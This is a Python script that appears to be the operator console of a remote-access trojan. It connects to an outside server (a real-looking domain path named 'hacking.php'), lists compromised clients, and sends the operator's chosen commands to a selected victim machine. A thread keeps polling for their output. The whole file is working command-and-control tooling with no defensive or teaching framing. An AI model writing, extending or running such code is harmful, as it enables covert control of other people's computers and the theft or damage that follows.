import socket
from threading import Thread
import time

class Receiving(Thread):
    def run(self):
        global client
        while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host_add, 80))
                s.send(url_creator('{"client":"' + client + '","action":"getresult"}'))
                reply = s.recv(1024).decode("utf-8")
                body = reply.split("*")
                if len(body[1]) > 5:
                    print(body[1])
                s.close()
                time.sleep(2)
















def url_creator(message):
    global host_add
    message = message.replace(" ", "_")
    url = f"GET http://{host_add}/api/hacking.php?msg={message} HTTP/1.0\r\n\r\n"
    print(url)
    return url.encode("utf-8")


def get_clients():
        global client
        controller = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        controller.connect((host_add, 80))
        controller.send(url_creator('{"action":"getclient"}'))
        msg = controller.recv(2048).decode()
        body = msg.split("*")
        print(body[1])
        client = input("Enter name of the client ")
        receiver = Receiving()
        receiver.start()
        hack()


def hack():
    global client
    session = True
    while session:
        cmd = input("Enter your command ")
        argument1 = ""
        argument2 = ""
        if cmd == "quit":
            session = False
            break
        argument1 = input("Enter first argument ")
        if argument1 != "":
            argument2 = input("Enter second argument ")
        controller = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        controller.connect((host_add, 80))
        controller.send(url_creator(
            '{"action":"save","cmd":"'+cmd+'","arg1":"'+argument1+'","arg2":"'+argument2+'","client":"'+client+'"}'))
        reply = controller.recv(5000).decode()
        body = reply.split("*")
        print("/n",body[1])
        controller.close()

host_add = "growengineer.tk"  # just for testing
client=''
get_clients()
